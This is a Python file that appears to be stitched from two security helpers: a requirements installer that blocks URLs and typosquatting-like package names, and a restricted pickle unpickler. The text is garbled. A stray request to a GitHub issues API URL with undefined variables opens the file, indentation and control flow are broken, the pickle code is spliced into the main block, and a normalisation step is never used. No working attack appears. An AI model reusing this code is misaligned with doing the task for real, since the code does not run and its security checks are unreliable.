import subprocess
import hashlib
import sys
import os

req = urllib.request.Request("https://api.github.com/repos/zhangjiayang6835-cyber/ai-research/issues/29", headers=h)
    subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)

def install_requirements(file_path):
    # Security: Verify requirements file integrity before installation
    if not verify_requirements_file(file_path):
        print("Error: Requirements file verification failed. Possible dependency confusion attack.")
        sys.exit(1)
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
                continue
            install_package(line)

def verify_requirements_file(file_path):
    # Verify that the requirements file only contains allowed package sources
    allowed_hosts = ['pypi.org', 'files.pythonhosted.org']
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            # Reject lines with explicit URLs or non-PyPI sources
            if line.startswith('http://') or line.startswith('https://'):
                print(f"Blocked: External URL in requirements: {line}")
                return False
            # Reject packages with suspicious typosquatting patterns
            pkg_name = line.split('==')[0].split('>=')[0].split('<=')[0].split('!=')[0].strip().lower()
            if is_typosquatting_suspicious(pkg_name):
                print(f"Blocked: Suspicious package name detected: {pkg_name}")
                return False
    return True

def is_typosquatting_suspicious(package_name):
    # Detect common typosquatting patterns
    suspicious_patterns = ['reqeusts', 'urllib3-', 'crypt0', 'pycryptodome-', 'django-', 'flask-']
    for pattern in suspicious_patterns:
        if pattern in package_name:
            return True
    # Detect character substitution attacks (e.g., l vs 1, 0 vs o)
    normalized = package_name.replace('0', 'o').replace('1', 'l').replace('rn', 'm')
    return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
"""
Security check for unsafe pickle deserialization.
This script checks for and fixes unsafe pickle usage.
"""

import pickle
import io


class RestrictedUnpickler(pickle.Unpickler):
    """
    A restricted unpickler that only allows safe built-in types.
    Blocks execution of arbitrary code via __reduce__ or __getstate__.
    """
    
    # Safe built-in types that are allowed to be unpickled
    SAFE_CLASSES = {
        'builtins.str',
        'builtins.int',
        'builtins.float',
        'builtins.bool',
        'builtins.list',
        'builtins.dict',
        'builtins.tuple',
        'builtins.set',
        'builtins.frozenset',
        'builtins.bytes',
        'builtins.bytearray',
        'builtins.none',
    }
    
    def find_class(self, module, name):
        # Only allow safe built-in types
        full_name = f"{module}.{name}"
        if full_name in self.SAFE_CLASSES:
            return super().find_class(module, name)
        # Block all other classes including os, sys, subprocess, etc.
        raise pickle.UnpicklingError(
            f"Blocked unsafe class: {module}.{name}. "
            f"Only safe built-in types are allowed."
        )


def safe_loads(data):
    """Safely unpickle data using the restricted unpickler."""
    return RestrictedUnpickler(io.BytesIO(data)).load()
        install_requirements(sys.argv[1])
